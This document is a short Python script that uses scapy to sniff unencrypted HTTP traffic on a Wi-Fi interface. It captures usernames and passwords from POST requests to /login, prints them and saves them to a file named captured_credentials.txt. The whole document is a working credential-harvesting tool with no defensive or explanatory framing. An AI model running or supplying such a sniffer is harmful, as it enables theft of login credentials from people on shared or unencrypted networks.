from scapy.all import sniff, Raw
import re

LOG_FILE = "captured_credentials.txt"

def catch_packet(packet):

    if packet.haslayer(Raw):

        data = packet[Raw].load.decode("utf-8", errors="ignore")

        # Look for POST request containing credentials
        if "POST /login" in data:

            print("\n[+] HTTP POST Request Captured")

            # Extract username
            username = re.search(r"username=([^&]+)", data)
            password = re.search(r"password=([^&\s]+)", data)

            if username and password:

                user = username.group(1)
                pwd = password.group(1)

                print(f"[+] Username : {user}")
                print(f"[+] Password : {pwd}")

                # Save to file
                with open(LOG_FILE, "a") as f:
                    f.write(f"Username: {user} | Password: {pwd}\n")

                print("[+] Credentials saved to captured_credentials.txt")


print("Starting packet sniffer...\n")

sniff(
    iface="Wi-Fi",
    filter="tcp port 80",
    prn=catch_packet,
    store=False
)